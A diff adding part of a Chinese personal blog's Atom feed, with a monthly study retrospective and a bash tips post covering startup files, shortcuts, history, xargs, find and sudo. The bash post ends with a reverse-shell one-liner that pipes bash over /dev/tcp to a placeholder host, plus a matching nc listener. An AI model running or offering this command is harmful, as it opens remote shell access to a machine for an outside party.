+<li>Take wish wall job</li>
+</ul>
+<h3 id="Workflow"><a href="#Workflow" class="headerlink" title="Workflow"></a>Workflow</h3><ul>
+<li>Confulunce</li>
+<li>DevOps Onboarding Guilde(Done)</li>
+<li>看完了《持续交付》和《敏捷故事》</li>
+</ul>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>总的来说过去两个月值得记住的事太少了，唯一觉得有所收获的就是学了下shell，在每个维度上的学习都不够深入，主要还是精力太分散所致，DevOps确实有很多坑，比如说你不能像做开发一样专注于一件事，但好处是你可以从更宏观的角度来看一个项目，应该说做事情的节奏是可以自己调整的，能从整体架构的角度看问题还是比较令人兴奋的。但是，目前来说中心偏离了技术，就偏离我的意愿了。<br>其实还有比较困惑的点是自己思维方式的能力，思维方式肯定不是以多为好，我们总是会为一个新观点感到醍醐灌顶，但是总会有新的新观点让我们的思考被颠覆，但我们依然不能放弃追逐真理。。恩。<br>那些很牛逼的人，并不是脑子转的有多快，而是你问他的问题他以前就思考过了，甚至回答过别人了，甚至参考过别人的回答，甚至将自己的答案发表过，在网上和别人激烈的讨论过，所以当你刚刚开始思考这个问题的时候他已经有了比较自信也比较完整的答案。他不是比你聪明，只是走在了你前面。<br>那么如何成为一个比较聪明的人呢？</p>
+<ul>
+<li>在别人遇到问题之前先发现问题</li>
+<li>反复咀嚼遇到过的问题</li>
+<li>记住你的解决方案，并帮助身边的人解决同样的问题 </li>
+</ul>
+<p>这样的成长轨迹很容易应用于技术领域，事实上一个程序员的成长很多就是按照这样的轨迹来的，但是如果把这个本领用于咨询，就变得困难了许多，因为描述问题本身就是一个问题，就跟早期的机器学习算法的建模一样，模型建的号，机器算法就优，技术领域的问题被封闭的语境限制着，所以能够有明确的答案，所以咨询的难点就变成了语境的建立和同一，比如“敏捷”，“精益”，一说这个语境，就好比技术上讲一个框架，这种方式适用于什么样的场景，有哪些优劣，一下就有了，我们在语境下的讨论就会变得有着落，明确，保证了沟通的效率。<br>回到学习能力建设的问题上来吧，虽然我们说没有一个确定的标准来构建你的知识体系，但是冥冥之中每个人都是有自己的standard的，比如说你至少认为人有理性和感性两个向量，比如说你认同三维比二维能更清楚地描述问题。<br>所以标准的建立有助于问题的分析和思考。</p>
+<h3 id="Well"><a href="#Well" class="headerlink" title="Well"></a>Well</h3><ul>
+<li>Bash workshop做的还不错</li>
+<li>对项目架构有了进一步认识</li>
+<li>对敏捷的工作方式更加熟悉了</li>
+<li>看问题的角度从一个开发提升到架构的层面</li>
+</ul>
+<h3 id="Lesswell"><a href="#Lesswell" class="headerlink" title="Lesswell"></a>Lesswell</h3><ul>
+<li>太久不写代码，感觉都要生疏了</li>
+<li>一直在写Document，做PPT，感觉没有在做有价值的工作。</li>
+<li>思维方式和思考能力并没有提高，只是换了个看问题的的角度</li>
+</ul>
+<h3 id="Suggestion"><a href="#Suggestion" class="headerlink" title="Suggestion"></a>Suggestion</h3><ul>
+<li>如果可能的话，希望多集中精力在技术上一点的成长</li>
+<li>希望自己的文档和思维方式更加结构化，可以在几种结构之间切换，但是得变得容易被人理解，容易传播，最好是发人深省</li>
+<li>多看书，看书，看书</li>
+</ul>
+<h2 id="Action"><a href="#Action" class="headerlink" title="Action"></a>Action</h2><h3 id="Role-Map"><a href="#Role-Map" class="headerlink" title="Role-Map"></a>Role-Map</h3><h3 id="Todo-list"><a href="#Todo-list" class="headerlink" title="Todo-list"></a>Todo-list</h3><p>下个月的学习计划主要是考取AWS认证，看几本书，以及尽快完成release standard</p>
+<ul>
+<li>AWS认证： 多看几篇文档，希望能够产出几篇博客</li>
+<li>关于看书，主要是在TWI之前，希望能把手里的两本看完，产出Session吧</li>
+<li>关于Release Standard，尽量在本周内完成</li>
+<li>git,Linux</li>
+<li>凤凰式部署</li>
+</ul>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;八月学习小计&quot;&gt;&lt;a href=&quot;#八月学习小计&quot; class=&quot;headerlink&quot; title=&quot;八月学习小计&quot;&gt;&lt;/a&gt;八月学习小计&lt;/h1&gt;&lt;p&gt;基本上讲，这两个月一直都在写文档，做PPT，提升所谓Consultant能力。&lt;br&gt;除此之外比较系统地学习了Shell和一些Linux有关的知识，自认为自身短板还是在技术上。&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="小结" scheme="https://www.duyidong.com/tags/%E5%B0%8F%E7%BB%93/"/>
+    
+      <category term="Study" scheme="https://www.duyidong.com/tags/Study/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Bash学习小计</title>
+    <link href="https://www.duyidong.com/2016/08/05/Bash%E5%AD%A6%E4%B9%A0%E5%B0%8F%E8%AE%A1/"/>
+    <id>https://www.duyidong.com/2016/08/05/Bash学习小计/</id>
+    <published>2016-08-05T00:09:15.000Z</published>
+    <updated>2017-04-12T13:17:50.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>最近一段时间在学习bash，作为一个小总结，记录一些bash使用的技巧以及知识点。</p>
+<h1 id="Shell是什么？"><a href="#Shell是什么？" class="headerlink" title="Shell是什么？"></a>Shell是什么？</h1><p>shell是一类解释性语言，通过其解释器与操作系统内核进行交互，shell分为Bshell 和Cshell两大类，我们所熟悉的bash和zsh都属于Bshell一类。shell脚本有两种执行方式，一种为交互式执行，即通常我们在Linux上的执行方式，一次只能执行一条命令（当然你可以把多条命令写到一行），多条命令不能同时执行。另一种方式为脚本执行，即把多条shell语句写到一个.sh文件里，然后在文件头#！/bin/bash调用解释器执行，这种方式的优点在于可重复执行和自动化。但shell的脚本通常不易读，所以展现shell优势的地方主要还是在交互执行中。<br>另外可以在/etc/shells文件里查看当前系统支持的shell。<br>bash作为大部分类Linux系统的标配，下面我主要围绕bash来讲。<br><a id="more"></a></p>
+<h1 id="Bash启动顺序"><a href="#Bash启动顺序" class="headerlink" title="Bash启动顺序"></a>Bash启动顺序</h1><p>1./etc/profile :此文件为系统的每个用户设置环境信息,当用户第一次登录时,该文件被执行。并从/etc/profile.d目录的配置文件中搜集shell的设置。<br>2.~/.bash_profile:每个用户都可使用该文件输入专用于自己使用的shell信息,当用户登录时,该文件仅仅执行一次!默认情况下,他设置一些环境变量,执行用户的.bashrc文件。<br>3.~/.bashrc:该文件包含专用于你的bash shell的bash信息,当登录时以及每次打开新的shell时,该文件被读取。<br>4.~/.bash_logout:当每次退出系统(退出bash shell)时,执行该文件。</p>
+<p>注意</p>
+<pre><code>~/.bash_profile 是交互式、login 方式进入 bash 运行的
+~/.bashrc 是交互式 non-login 方式进入 bash 运行的
+通常二者设置大致相同，所以通常前者会调用后者。
+</code></pre><p>所以我们通常会吧环境变量的一些设置保存在~/.bash_profile中，把一些命令行，脚本调用写到~/.bashrc里面</p>
+<h1 id="Bash快捷键"><a href="#Bash快捷键" class="headerlink" title="Bash快捷键"></a>Bash快捷键</h1><h2 id="用好你的Control键"><a href="#用好你的Control键" class="headerlink" title="用好你的Control键"></a>用好你的Control键</h2><p>Control键是所有类Unix系统（Mac, Linux）下一个非常有用的按键，但也是一个经常被忽视的按键，特别是在Mac平台下，Command键完全代替了在Windows平台下的Ctrl键，很多人不清楚为什么Apple又额外加了一个Control键，我想这和著名的Emacs编辑器有关，Emacs下有很多方便的快捷键，其中很多都需要用到Control键，Mac系统就原生继承了很多这些快捷键，下面就根据我在实际开发过程中遇到的具体情况来总结一下如何用好Control键，效率真能提高不少。</p>
+<h3 id="Control的常用组合键"><a href="#Control的常用组合键" class="headerlink" title="Control的常用组合键"></a>Control的常用组合键</h3><p>移动类</p>
+<blockquote>
+<ul>
+<li>Control-F 前进光标 (效果同右方向键)</li>
+<li>Control-B 后退光标（效果同左方向键)</li>
+<li>Control-P 光标上移（效果同上方向键）</li>
+<li>Control-N 光标下移（效果同下方向键）</li>
+<li>Control-A 光标移动到行首</li>
+<li>Control-E 光标移动到行尾</li>
+</ul>
+</blockquote>
+<p> 删除类</p>
+<blockquote>
+<ul>
+<li>Control-D 删除光标后面的一个字符</li>
+<li>Control-H 删除光标前面的一个字符</li>
+<li>Control-K 删除当前行光标以后的所有字符</li>
+<li>Control-W 删除光标前的一个单词</li>
+<li><p>Control-U 删除当前行的所有字符<br>其它类</p>
+</li>
+<li><p>Control-T 交换光标两边的字符</p>
+</li>
+<li>Control-L 清屏(仅适用于终端下)<h3 id="一些常用场景"><a href="#一些常用场景" class="headerlink" title="一些常用场景"></a>一些常用场景</h3></li>
+</ul>
+</blockquote>
+<ol>
+<li><p>通常情况下，上下左右键都远离主键盘区，如果在你高速打字的过程中需要移动输入光标位置，这个时候直接通过上下左右键就不得不将右手移出主键盘区，就会降低输入的速度，通常这个时候你就可以通过Control的组合键达到快速移动光标的目的。再比如你在一些IDE(Xcode,Android Studio等)里面选择代码补全的不同候选项时，就可以通过Control-P与Control-N来达到切换选择不同候选项的操作.</p>
+</li>
+<li><p>Mac的键盘上没有Home与End键, 如果你想将光标快速移动到行首与行尾就比较麻烦(当然你可以通过Command与-&gt; 或Command与&lt;-实现,但这样你又需要去操作方向键, 方向键远离主键盘区, 速度势必会降低), 这时你就可以通过Control-A 与 Control-E实现, 这两个组合键非常适合在终端下使用</p>
+</li>
+<li><p>有些时候你在终端下输入了很长的命令, 但发现输入有误, 需要完全删除重新输入, 通常情况下你都会使用Delete键去做, 但Delete只能一次删除一个字符, 速度很慢, 这时你就可以通过Control-U键快速的达到清除当前所有输入的目的, 再比如你当前的输入只有从中间某个位置向后是错误的, 这时你可以通过Control-B或Control-F将光标移动到对应位置, 然后再利用Control-K快速达到删除当前光标后所有输入的目的</p>
+</li>
+<li><p>在输入的过程中如果发现个别字符不对需要删除重新输入, 你当然可以通过Delete键达到, 但 Delete键和方向键一样有点远, 更方便的你可以通过Control-D 与 Control-H实现, 还有些时候错的不是一个或几个字符,而是一个或几个单词你可以Control-W达到</p>
+</li>
+<li><p>在终端下如何清屏? 很多人都是通过输入clear达到, 但如果这时你终端里正输入的有一条待执行的命令,这条命令的输出可能有很多你想清一下屏后再执行, 你怎么办,总不能删除当前命令后再输入clear命令, 然后再重新输入刚才的那条命令吧, 其实这时你可以通过Control-L组合键达到目的,这个差不多是我在终端下用的最多的一个快捷键了.</p>
+</li>
+</ol>
+<h3 id="关于编辑模式的设置"><a href="#关于编辑模式的设置" class="headerlink" title="关于编辑模式的设置"></a>关于编辑模式的设置</h3><p>在交互式执行bash中，可以通过set -o的方式查看当前编辑模式，我们通常采用set -o emaces的方式设置以上快捷键为可操作，需要注意的是，如果你不选择一种快捷键设置”set +o emaces”你连最熟悉的上下键切换history命令都用不了。</p>
+<h2 id="Alias"><a href="#Alias" class="headerlink" title="Alias"></a>Alias</h2><p>bash的一个将长命令替换为短命令的方式，可以直接在bash交互执行中输入alias查看已经被设置的快捷键，以<code>alias la=&#39;ls -al&#39;</code>的方式设置快捷键，当然直接键入命令只对当前打开的shell有效，如果想长期生效，我们通常的做法是把它写到/etc/profile.d/目录下的shell里面，会被/etc/profile调用的一个全局配置。当然在工作环境中我们会把它配到home目录下（因为/etc目录下会对所有用户生效，想想也是不科学的）所以我们更经常写到~/.bashrc里面。</p>
+<h1 id="关于环境变量"><a href="#关于环境变量" class="headerlink" title="关于环境变量"></a>关于环境变量</h1><p>bash的环境变量可以用<code>set</code> <code>env</code> 两种方式查看，这里主要说一下两种变量的区别，当你在命令行中用赋值的方式申明一个变量，(example: TEXT=123)，这个变量只存在set中，即当前shell生效，不会传递到subshell里面，如果是文本执行的脚本，这种变量申明方式定义的变量也只会在文件内生效，如果想让别的脚本调用这些变量,可以通过export的方式将变量导入到env里面，可以理解为全局变量。<br>这里我还想提一个比较有意思的环境变量PS1，你可以将它设置为<code>export PS1=&quot;(\!) \[\e[31m\] \[\A\] \[\e[32m\]\u@\h \[\e[34m\]\w \[\e[30m\]$&quot;</code>试一下，是个非常有意思的值。</p>
+<h1 id="Windows和Linux脚本的转换问题"><a href="#Windows和Linux脚本的转换问题" class="headerlink" title="Windows和Linux脚本的转换问题"></a>Windows和Linux脚本的转换问题</h1><p>我们都知道windows和Linux的文件类型不同，那么在windows下编写的脚本如何在Linux下执行呢？当我们从windows下拷贝一个文件到Linux上，可以使用<code>cat -A</code>命令查看到文件隐藏字符，发现有很多脏数据，于是可以用<code>dos2unix file.sh</code>的方式把文件转化过来。</p>
+<h1 id="关于历史命令"><a href="#关于历史命令" class="headerlink" title="关于历史命令"></a>关于历史命令</h1><p>history可以查看当前用户的历史命令，每个用户的history藏在~/.bash_hitory下，可以查看。<br>可以使用<code>!!</code>执行上一条命令 <code>![number]</code>执行第number条命令，<code>！[string]</code>执行以string开头的上一条命令<br>另外control+r可以根据字符串快捷搜索历史命令.</p>
+<h1 id="关于参数传递"><a href="#关于参数传递" class="headerlink" title="关于参数传递"></a>关于参数传递</h1><ol>
+<li>`` $()<br> 这两种方式是相同的，即重新打开一个shell执行完退出，并使用返回值代替脚本调用部分内容</li>
+<li><p>| xargs 区别于管道符，是将前面的命令作为后面命令的命令参数，而管道符是将前面输出作为后面命令的标准输入。<br> 再解释一 | 和 | xargs 的区别：</p>
+<pre><code> echo -l | ls 输出： 等同于 ls
+ echo -l | xargs ls 输出 等同于 ls -l
+</code></pre><p> 好了，剩下的自己体会。</p>
+</li>
+<li>find 的 -exec<br> xargs有个缺点，在大量执行命令（成千上万）的时候可能因为执行的命令过多失败，而find的-exec 是为逐个命令执行，不会遇到此类问题，作为-exec的标配，应该在后面加上{} \;末尾的\;其实是转意，恩，此处按下不表。</li>
+</ol>
+<h1 id="关于文件查找"><a href="#关于文件查找" class="headerlink" title="关于文件查找"></a>关于文件查找</h1><p>find 是一个事实文件便利工具，比较强大,可以用<code>find / -name &quot;*.sh&quot;</code>的方式查找/中包含.sh结尾的文件，如果遇到一堆permission deny的问题可以用输出重定向的方式解决<code>find /-name &quot;*.sh&quot; 2&gt;&gt; /dev/null</code>（2为文件状态符，0表示标准输入，1表示标准输出，2表示错误输出，&gt;&gt;为重定向，表示将输出叠加导入到后面的文件中,/dev/null为Linux系统的垃圾桶）,这个命令比较常用，但是效率很低，占用内存也比较高，推荐使用locate命令，类似于window系统里的everything，将文件信息保存在/var/lib/mlocate/mlocatedb数据库里，使用<code>updatedb</code>更新数据库，<code>locate filename</code>的方式查找文件，更高效，速度也更快。</p>
+<h1 id="关于bash-history"><a href="#关于bash-history" class="headerlink" title="关于bash_history"></a>关于bash_history</h1><p>放一个bash_histroy的命令：<a href="http://rockhong.github.io/history-in-bash.html" target="_blank" rel="external">http://rockhong.github.io/history-in-bash.html</a><br>bash使用的历史命令会先写入内存（在退出subshell之前在.bash_history中不可见，也不可传递到子进程），在退出shell的时候写入子进程。这里说几个对bash_history的需求以及解决方案。</p>
+<h2 id="多个终端不覆盖history"><a href="#多个终端不覆盖history" class="headerlink" title="多个终端不覆盖history:"></a>多个终端不覆盖history:</h2><p>如果同一用户在不同终端登录，bash_histroy只能保存最后一个用户登录的bash_histroy，解决这个问题：<br>简单来说，你在.bashrc里面添加这句就够了：</p>
+<pre><code>shopt -s histappend
+</code></pre><h2 id="history上限设大："><a href="#history上限设大：" class="headerlink" title="history上限设大："></a>history上限设大：</h2><pre><code># 设置历史记录条数
+export HISTFILESIZE=40000000
+# 设置显示历史记录条数
+export HISTSIZE=10000
+</code></pre><h2 id="history定期备份"><a href="#history定期备份" class="headerlink" title="history定期备份"></a>history定期备份</h2><p>很多情况下我们希望保存更多的bash_history以方便以后查阅，但是如果把.bash_history设置得很大的话，bash在启动时会占用大量内存（100000条大概要10M），这是我们不想看到的，所以应该养成定期备份的习惯，推荐把bash_histroy按时间备份比如每天+data&gt;&gt;bash_histroy.back.</p>
+<h1 id="关于sudo"><a href="#关于sudo" class="headerlink" title="关于sudo"></a>关于sudo</h1><p>这里我要说的是用户切换<br>大家都知道su命令是用来切换用户的，su - 可以完全切换到用户（新开一个shell，加载~/.bash_profile及~/.bashrc），但是在有的情况下，sudo -iu 也可以切换用户。<br>首先：<code>sudo -i</code> 是以root身份新开一个shell，<code>sudo -u &lt;user&gt; &lt;command&gt;</code>是以user身份执行command，现在我要说一条神奇的命令：</p>
+<pre><code>sudo -iu &lt;user&gt;
+</code></pre><p>它等价于<code>sudo -u root &lt;user_shell&gt;</code><br>是不是很神奇？<br>我们来看一个更神奇的:<br>visudo(当然需要root身份或者sudo权限)，编辑/etc/sudoers（或者/etc/sudoers.d/文件下的文件），添加如下代码：</p>
+<pre><code>user1 ALL=(user2) NOPASSWD: &lt;user_shell&gt;
+</code></pre><p>就可以让user1免密码sudo到user2，是不是很有趣。<br>顺便说一下你可以使用这个配置来管理所有sudo权限。</p>
+<h1 id="另外记几个Linux下的常用工具"><a href="#另外记几个Linux下的常用工具" class="headerlink" title="另外记几个Linux下的常用工具"></a>另外记几个Linux下的常用工具</h1><pre><code>1. tldr 查看文档用的，安装比较复杂，而且是联网查找，虚拟机上速度可能会比较慢
+sudo yum -y install epel-release
+sudo yum -y install python-pip
+pip install --upgrade pip
+pip install tldr
+2. tmux 据说是screen的进阶版，分屏用的
+3. lsof端口查看
+4. nc网络瑞士军刀，占用端口:nc -k -l -p 8080 2&gt;&gt; /dev/null
+5. shudown 可以定时关机，重启，取消关机
+6. pstree 进程树
+7. grep 逐行扫描文件
+8. wc 统计
+9. top 查看内存等信息
+10. rpm 包管理（二进制包）
+11. sl 仅仅是为了好玩，小火车开过。。
+12. cmatrix 也是为了好玩，黑客帝国
+</code></pre><h1 id="最后说一下Bash和Zsh哪个好"><a href="#最后说一下Bash和Zsh哪个好" class="headerlink" title="最后说一下Bash和Zsh哪个好"></a>最后说一下Bash和Zsh哪个好</h1><p>当然是Zsh好啦，具体怎么好，你不需要太知道，总之Zsh比Bash很多地方都要强大，在Bash的基础上增加了一些配置。。</p>
+<h1 id="记一个Bash遇到的小坑"><a href="#记一个Bash遇到的小坑" class="headerlink" title="记一个Bash遇到的小坑"></a>记一个Bash遇到的小坑</h1><p>Bash的变量只会被扫描替换一遍，所以当我们的变量里包含其他变量我们需要扫描两遍需要使用eval，类似于python的eval()将字符串当做表达式，用法如下：</p>
+<pre><code>#!/bin/sh
+
+s=Start
+Start_ops=hello
+name=$1
+echo &quot;$s&quot;&quot;_ops&quot;
+eval echo \$&quot;$s&quot;_ops &quot;$name&quot;
+</code></pre><p>运行 ./test.sh world<br>打印出hello word</p>
+<p><strong>但是！！</strong>我现在要说的是请不要使用这种方式，因为邪恶的eval会引起bash注入的问题，就提示到这里，剩下的自己感受。。</p>
+<h1 id="推荐一个Linux命令查询的网站"><a href="#推荐一个Linux命令查询的网站" class="headerlink" title="推荐一个Linux命令查询的网站"></a>推荐一个Linux命令查询的网站</h1><p><a href="http://man.linuxde.net/" target="_blank" rel="external">http://man.linuxde.net/</a></p>
+<h1 id="再列一堆Linux下贼好用的工具"><a href="#再列一堆Linux下贼好用的工具" class="headerlink" title="再列一堆Linux下贼好用的工具"></a>再列一堆Linux下贼好用的工具</h1><p><a href="https://gist.github.com/ADU-21/170a6d0f8756935cead9361bdea0bc67" target="_blank" rel="external">https://gist.github.com/ADU-21/170a6d0f8756935cead9361bdea0bc67</a></p>
+<p>另外： 后面还得写一个关于vim的快捷操作的文章。</p>
+<h1 id="Bash-反弹Shell"><a href="#Bash-反弹Shell" class="headerlink" title="Bash 反弹Shell"></a>Bash 反弹Shell</h1><pre><code>bash -i &gt;&amp; /dev/tcp/x.x.x.x/2333 0&gt;&amp;1
+# 然后在x.x.x.x这台server上执行：
+nc -l 2333
+</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;最近一段时间在学习bash，作为一个小总结，记录一些bash使用的技巧以及知识点。&lt;/p&gt;
+&lt;h1 id=&quot;Shell是什么？&quot;&gt;&lt;a href=&quot;#Shell是什么？&quot; class=&quot;headerlink&quot; title=&quot;Shell是什么？&quot;&gt;&lt;/a&gt;Shell是什么？&lt;/h1&gt;&lt;p&gt;shell是一类解释性语言，通过其解释器与操作系统内核进行交互，shell分为Bshell 和Cshell两大类，我们所熟悉的bash和zsh都属于Bshell一类。shell脚本有两种执行方式，一种为交互式执行，即通常我们在Linux上的执行方式，一次只能执行一条命令（当然你可以把多条命令写到一行），多条命令不能同时执行。另一种方式为脚本执行，即把多条shell语句写到一个.sh文件里，然后在文件头#！/bin/bash调用解释器执行，这种方式的优点在于可重复执行和自动化。但shell的脚本通常不易读，所以展现shell优势的地方主要还是在交互执行中。&lt;br&gt;另外可以在/etc/shells文件里查看当前系统支持的shell。&lt;br&gt;bash作为大部分类Linux系统的标配，下面我主要围绕bash来讲。&lt;br&gt;
+    
+    </summary>
+    
+    
+      <category term="学习" scheme="https://www.duyidong.com/tags/%E5%AD%A6%E4%B9%A0/"/>
+    
+      <category term="Linux" scheme="https://www.duyidong.com/tags/Linux/"/>
+    
+      <category term="Shell" scheme="https://www.duyidong.com/tags/Shell/"/>
+    
+      <category term="小计" scheme="https://www.duyidong.com/tags/%E5%B0%8F%E8%AE%A1/"/>
+    
+  </entry>
+  
+</feed>
